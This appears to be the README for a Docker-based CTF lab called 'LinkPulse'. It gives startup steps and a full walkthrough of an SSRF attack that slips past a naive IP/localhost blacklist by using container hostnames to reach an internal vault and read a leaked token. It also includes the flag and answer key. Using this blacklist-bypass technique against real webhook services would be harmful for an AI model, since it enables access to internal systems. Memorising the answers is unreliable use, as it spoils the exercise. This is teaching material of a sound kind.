# CTF Challenge 2: LinkPulse (Webhook SSRF & Cloud Pivot)

* **Category**: Web / Cloud & Network Security (SSRF Pivot)
* **Difficulty**: Medium
* **Target Port**: `http://localhost:8002`
* **Flag**: `CTF{ssrf_t0_1nt3rn4l_p1v0t_fl4g_2026}`

---

## 🚀 How to Run (1-Command Startup)

Make sure **Docker** is running on your machine, then open your terminal in this directory:

### Any OS (Linux / Mac / Windows):
```bash
docker compose up -d --build
```

### Or using helper scripts:
* **Linux / Mac**: `chmod +x start.sh && ./start.sh`
* **Windows**: `.\start.ps1`

Once started, open your browser and navigate to:
👉 **`http://localhost:8002`**

To stop the containers:
```bash
docker compose down
```

---

## 🎯 Challenge Story & Description for Players
> *LinkPulse provides an automated webhook delivery and latency testing engine. To prevent abuse, the developers implemented an IP blacklist filter protecting internal subnets. However, rumors say an unexposed internal authentication vault is reachable inside their cloud container network. Can you pivot through LinkPulse and extract the flag?*

---

## 🔍 How to Solve (Walkthrough)

### Step 1: Probe the Webhook Health Check
Go to `http://localhost:8002`. You will see a webhook test form.
* Trying `http://127.0.0.1` or `http://localhost` returns:  
  `❌ Security Guardrail Triggered: Access to 'localhost' is forbidden by corporate security policies.`
* This reveals the server uses a naive regex blacklist that only filters raw IP addresses and the word `localhost`.

### Step 2: Pivot into the Private Docker Network
In Docker, containers communicate via container hostnames. Enter:
```
http://internal-vault:5000
```
Click **"Ping Endpoint"**.  
The internal service responds with:
```json
{
  "service": "Core Security Vault (Internal Network Gateway)",
  "documentation": "/api/docs"
}
```

### Step 3: Inspect Leaked Documentation
Enter:
```
http://internal-vault:5000/api/docs
```
Click **"Ping Endpoint"**.  
The documentation leaks the secret token and flag route:
```json
{
  "path": "/api/v1/admin/flag",
  "auth": {
    "or_query_param": "token",
    "required_token": "corp_internal_secret_99812"
  }
}
```

### Step 4: Exfiltrate the Flag
Enter:
```
http://internal-vault:5000/api/v1/admin/flag?token=corp_internal_secret_99812
```
Click **"Ping Endpoint"**.  
The internal vault returns:
```json
{
  "status": "authorized",
  "message": "Flag retrieved from secure enclave.",
  "flag": "CTF{ssrf_t0_1nt3rn4l_p1v0t_fl4g_2026}"
}
```

---

## 🤖 Automated Solver Verification
To verify the challenge automatically via Python script:
```bash
python solution/solve.py
```
*(Requires `requests` library: `pip install requests`)*
